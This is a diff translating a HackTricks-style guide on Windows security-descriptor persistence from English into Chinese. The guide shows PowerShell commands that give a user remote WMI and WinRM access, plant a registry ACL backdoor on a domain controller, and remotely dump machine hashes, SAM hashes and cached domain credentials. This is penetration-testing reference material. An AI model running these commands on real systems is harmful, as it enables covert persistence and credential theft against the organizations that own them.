@@ -1,37 +1,32 @@
-# Security Descriptors
+# 安全描述符
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Security Descriptors
+## 安全描述符
 
-[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
+[来自文档](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)：安全描述符定义语言（SDDL）定义了用于描述安全描述符的格式。SDDL使用ACE字符串用于DACL和SACL：`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
 
-The **security descriptors** are used to **store** the **permissions** an **object** has **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.
+**安全描述符**用于**存储**一个**对象**对另一个**对象**的**权限**。如果您可以在一个对象的**安全描述符**中**做出一点改变**，您可以在不需要成为特权组成员的情况下获得对该对象非常有趣的权限。
 
-Then, this persistence technique is based on the ability to win every privilege needed against certain objects, to be able to perform a task that usually requires admin privileges but without the need of being admin.
+因此，这种持久性技术基于赢得对某些对象所需的每个权限的能力，以便能够执行通常需要管理员权限的任务，但不需要成为管理员。
 
-### Access to WMI
+### 访问WMI
 
-You can give a user access to **execute remotely WMI** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
-
+您可以给用户访问**远程执行WMI**的权限 [**使用这个**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)：
 ```bash
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
 ```
+### 访问 WinRM
 
-### Access to WinRM
-
-Give access to **winrm PS console to a user** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
-
+给用户提供 **winrm PS 控制台的访问权限** [**使用这个**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
+### 远程访问哈希
 
-### Remote access to hashes
-
-Access the **registry** and **dump hashes** creating a **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** so you can at any moment retrieve the **hash of the computer**, the **SAM** and any **cached AD** credential in the computer. So, it's very useful to give this permission to a **regular user against a Domain Controller computer**:
-
+访问 **registry** 并 **dump hashes** 创建一个 **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** 这样你可以随时检索 **计算机的哈希**、**SAM** 以及计算机中的任何 **缓存的 AD** 凭据。因此，将此权限授予 **普通用户对域控制器计算机** 是非常有用的：
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -45,8 +40,6 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-
-Check [**Silver Tickets**](silver-ticket.md) to learn how you could use the hash of the computer account of a Domain Controller.
+查看 [**Silver Tickets**](silver-ticket.md) 以了解如何使用域控制器计算机帐户的哈希值。
 
 {{#include ../../banners/hacktricks-training.md}}
-
